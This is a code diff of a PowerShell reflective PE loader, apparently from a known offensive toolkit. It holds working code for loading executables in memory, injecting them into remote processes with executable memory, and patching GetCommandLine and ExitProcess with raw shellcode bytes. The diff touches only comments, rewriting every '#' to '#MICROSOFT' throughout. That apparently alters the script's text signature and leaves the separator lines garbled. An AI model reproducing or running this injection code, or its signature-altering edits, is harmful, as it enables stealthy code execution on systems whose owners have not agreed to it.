 				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
 			}
 		
-			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
+			#MICROSOFTIf SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
 			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
 			{
 				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
@@ -1441,10 +1441,10 @@ $RemoteScriptBlock = {
 		)
 		
 		[Int64]$BaseDifference = 0
-		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
+		$AddDifference = $true #MICROSOFTTrack if the difference variable should be added or subtracted from variables
 		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
 		
-		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
+		#MICROSOFTIf the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
 		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
 				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
 		{
@@ -1462,11 +1462,11 @@ $RemoteScriptBlock = {
 			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
 		}
 		
-		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
+		#MICROSOFTUse the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
 		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
 		while($true)
 		{
-			#If SizeOfBlock == 0, we are done
+			#MICROSOFTIf SizeOfBlock == 0, we are done
 			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
 
 			if ($BaseRelocationTable.SizeOfBlock -eq 0)
@@ -1477,14 +1477,14 @@ $RemoteScriptBlock = {
 			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
 			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
 
-			#Loop through each relocation
+			#MICROSOFTLoop through each relocation
 			for($i = 0; $i -lt $NumRelocations; $i++)
 			{
-				#Get info for this relocation
+				#MICROSOFTGet info for this relocation
 				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
 				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
 
-				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
+				#MICROSOFTFirst 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
 				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
 				[UInt16]$RelocType = $RelocationInfo -band 0xF000
 				for ($j = 0; $j -lt 12; $j++)
@@ -1496,7 +1496,7 @@ $RemoteScriptBlock = {
 				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
 						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
 				{			
-					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
+					#MICROSOFTGet the current memory address and update it based off the difference between PE expected base address and actual base address
 					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
 					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
 		
@@ -1513,7 +1513,7 @@ $RemoteScriptBlock = {
 				}
 				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
 				{
-					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
+					#MICROSOFTIMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
 					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
 				}
 			}
@@ -1561,7 +1561,7 @@ $RemoteScriptBlock = {
 			{
 				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 				
-				#If the structure is null, it signals that this is the end of the array
+				#MICROSOFTIf the structure is null, it signals that this is the end of the array
 				if ($ImportDescriptor.Characteristics -eq 0 `
 						-and $ImportDescriptor.FirstThunk -eq 0 `
 						-and $ImportDescriptor.ForwarderChain -eq 0 `
@@ -1590,21 +1590,21 @@ $RemoteScriptBlock = {
 					throw "Error importing DLL, DLLName: $ImportDllPath"
 				}
 				
-				#Get the first thunk, then loop through all of them
+				#MICROSOFTGet the first thunk, then loop through all of them
 				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
-				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
+				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #MICROSOFTCharacteristics is overloaded with OriginalFirstThunk
 				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 				
 				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
 				{
 					$ProcedureName = ''
-					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
-					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
-					#	and doing the comparison, just see if it is less than 0
+					#MICROSOFTCompare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
+					#MICROSOFT	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
+					#MICROSOFT	and doing the comparison, just see if it is less than 0
 					[IntPtr]$NewThunkRef = [IntPtr]::Zero
 					if([Int64]$OriginalThunkRefVal -lt 0)
 					{
-						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
+						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #MICROSOFTThis is actually a lookup by ordinal
 					}
 					else
 					{
@@ -1753,8 +1753,8 @@ $RemoteScriptBlock = {
 		}
 	}
 	
-	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
-	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
+	#MICROSOFTThis function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
+	#MICROSOFTReturns an object with addresses to copies of the bytes that were overwritten (and the count)
 	Function Update-ExeFunctions
 	{
 		Param(
@@ -1779,7 +1779,7 @@ $RemoteScriptBlock = {
 		$ExeDoneBytePtr
 		)
 		
-		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
+		#MICROSOFTThis will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
 		$ReturnArray = @() 
 		
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
@@ -1797,9 +1797,9 @@ $RemoteScriptBlock = {
 			throw "KernelBase handle null"
 		}
 
-		#################################################
-		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
-		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+		#MICROSOFTFirst overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
+		#MICROSOFT	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
 		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 	
@@ -1811,11 +1811,11 @@ $RemoteScriptBlock = {
 			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
 		}
 
-		#Prepare the shellcode
+		#MICROSOFTPrepare the shellcode
 		[Byte[]]$Shellcode1 = @()
 		if ($PtrSize -eq 8)
 		{
-			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
+			$Shellcode1 += 0x48	#MICROSOFT64bit shellcode has the 0x48 before the 0xb8
 		}
 		$Shellcode1 += 0xb8
 		
@@ -1823,7 +1823,7 @@ $RemoteScriptBlock = {
 		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
 		
 		
-		#Make copy of GetCommandLineA and GetCommandLineW
+		#MICROSOFTMake copy of GetCommandLineA and GetCommandLineW
 		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
@@ -1831,7 +1831,7 @@ $RemoteScriptBlock = {
 		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
 		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
 
-		#Overwrite GetCommandLineA
+		#MICROSOFTOverwrite GetCommandLineA
 		[UInt32]$OldProtectFlag = 0
 		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
@@ -1849,7 +1849,7 @@ $RemoteScriptBlock = {
 		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		
 		
-		#Overwrite GetCommandLineW
+		#MICROSOFTOverwrite GetCommandLineW
 		[UInt32]$OldProtectFlag = 0
 		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
@@ -1865,14 +1865,14 @@ $RemoteScriptBlock = {
 		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
 		
 		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
-		#################################################
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 		
 		
-		#################################################
-		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
-		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
-		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
-		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+		#MICROSOFTFor C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
+		#MICROSOFT	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
+		#MICROSOFT	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
+		#MICROSOFT	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
 		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
 			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
 		
@@ -1891,7 +1891,7 @@ $RemoteScriptBlock = {
 				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 				
-				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
+				#MICROSOFTMake a copy of the original char* and wchar_t* so these variables can be returned back to their original state
 				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
 				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
 				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
@@ -1918,16 +1918,16 @@ $RemoteScriptBlock = {
 				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
 			}
 		}
-		#################################################
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 		
 		
-		#################################################
-		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+		#MICROSOFTNext overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
 
 		$ReturnArray = @()
-		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
+		$ExitFunctions = @() #MICROSOFTArray of functions to overwrite so the thread doesn't exit the process
 		
-		#CorExitProcess (compiled in to visual studio c++)
+		#MICROSOFTCorExitProcess (compiled in to visual studio c++)
 		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
 		if ($MscoreeHandle -eq [IntPtr]::Zero)
 		{
@@ -1940,7 +1940,7 @@ $RemoteScriptBlock = {
 		}
 		$ExitFunctions += $CorExitProcessAddr
 		
-		#ExitProcess (what non-managed programs use)
+		#MICROSOFTExitProcess (what non-managed programs use)
 		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
 		if ($ExitProcessAddr -eq [IntPtr]::Zero)
 		{
@@ -1952,11 +1952,11 @@ $RemoteScriptBlock = {
 		foreach ($ProcExitFunctionAddr in $ExitFunctions)
 		{
 			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
-			#The following is the shellcode (Shellcode: ExitThread.asm):
-			#32bit shellcode
+			#MICROSOFTThe following is the shellcode (Shellcode: ExitThread.asm):
+			#MICROSOFT32bit shellcode
 			[Byte[]]$Shellcode1 = @(0xbb)
 			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
-			#64bit shellcode (Shellcode: ExitThread.asm)
+			#MICROSOFT64bit shellcode (Shellcode: ExitThread.asm)
 			if ($PtrSize -eq 8)
 			{
 				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
@@ -1977,13 +1977,13 @@ $RemoteScriptBlock = {
 				Throw "Call to VirtualProtect failed"
 			}
 			
-			#Make copy of original ExitProcess bytes
+			#MICROSOFTMake copy of original ExitProcess bytes
 			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
 			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
 			
-			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
-			#	call ExitThread
+			#MICROSOFTWrite the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
+			#MICROSOFT	call ExitThread
 			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
 			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
 			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
@@ -1996,14 +1996,14 @@ $RemoteScriptBlock = {
 
 			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		}
-		#################################################
+		#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 
 		Write-Output $ReturnArray
 	}
 	
 	
-	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
-	#	It copies Count bytes from Source to Destination.
+	#MICROSOFTThis function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
+	#MICROSOFT	It copies Count bytes from Source to Destination.
 	Function Copy-ArrayOfMemAddresses
 	{
 		Param(
@@ -2036,9 +2036,9 @@ $RemoteScriptBlock = {
 	}
 
 
-	#####################################
-	##########    FUNCTIONS   ###########
-	#####################################
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT    FUNCTIONS   #MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 	Function Get-MemoryProcAddress
 	{
 		Param(
@@ -2055,7 +2055,7 @@ $RemoteScriptBlock = {
 		$Win32Constants = Get-Win32Constants
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		
-		#Get the export table
+		#MICROSOFTGet the export table
 		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
 		{
 			return [IntPtr]::Zero
@@ -2065,15 +2065,15 @@ $RemoteScriptBlock = {
 		
 		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
 		{
-			#AddressOfNames is an array of pointers to strings of the names of the functions exported
+			#MICROSOFTAddressOfNames is an array of pointers to strings of the names of the functions exported
 			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
 			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
 			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
 
 			if ($Name -ceq $FunctionName)
 			{
-				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
-				#    which contains the offset of the function in to the DLL
+				#MICROSOFTAddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
+				#MICROSOFT    which contains the offset of the function in to the DLL
 				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
 				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
 				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
@@ -2104,7 +2104,7 @@ $RemoteScriptBlock = {
 		
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		
-		#Get Win32 constants and functions
+		#MICROSOFTGet Win32 constants and functions
 		$Win32Constants = Get-Win32Constants
 		$Win32Functions = Get-Win32Functions
 		$Win32Types = Get-Win32Types
@@ -2115,7 +2115,7 @@ $RemoteScriptBlock = {
 			$RemoteLoading = $true
 		}
 		
-		#Get basic PE information
+		#MICROSOFTGet basic PE information
 		Write-Verbose "Getting basic PE information from the file"
 		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
 		$OriginalImageBase = $PEInfo.OriginalImageBase
@@ -2127,7 +2127,7 @@ $RemoteScriptBlock = {
 		}
 		
 		
-		#Verify that the PE and the current process are the same bits (32bit or 64bit)
+		#MICROSOFTVerify that the PE and the current process are the same bits (32bit or 64bit)
 		$Process64Bit = $true
 		if ($RemoteLoading -eq $true)
 		{
@@ -2150,7 +2150,7 @@ $RemoteScriptBlock = {
 				$Process64Bit = $false
 			}
 			
-			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
+			#MICROSOFTPowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
 			$PowerShell64Bit = $true
 			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
 			{
@@ -2174,7 +2174,7 @@ $RemoteScriptBlock = {
 		}
 		
 
-		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
+		#MICROSOFTAllocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
 		Write-Verbose "Allocating memory for the PE and write its headers to memory"
 		
 		[IntPtr]$LoadAddr = [IntPtr]::Zero
@@ -2184,14 +2184,14 @@ $RemoteScriptBlock = {
 			[IntPtr]$LoadAddr = $OriginalImageBase
 		}
 
-		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
-		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
+		$PEHandle = [IntPtr]::Zero				#MICROSOFTThis is where the PE is allocated in PowerShell
+		$EffectivePEHandle = [IntPtr]::Zero		#MICROSOFTThis is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
 		if ($RemoteLoading -eq $true)
 		{
-			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
+			#MICROSOFTAllocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
 			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			
-			#todo, error handling needs to delete this memory if an error happens along the way
+			#MICROSOFTtodo, error handling needs to delete this memory if an error happens along the way
 			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			if ($EffectivePEHandle -eq [IntPtr]::Zero)
 			{
@@ -2219,7 +2219,7 @@ $RemoteScriptBlock = {
 		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
 		
 		
-		#Now that the PE is in memory, get more detailed information about it
+		#MICROSOFTNow that the PE is in memory, get more detailed information about it
 		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
@@ -2227,17 +2227,17 @@ $RemoteScriptBlock = {
 		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
 		
 		
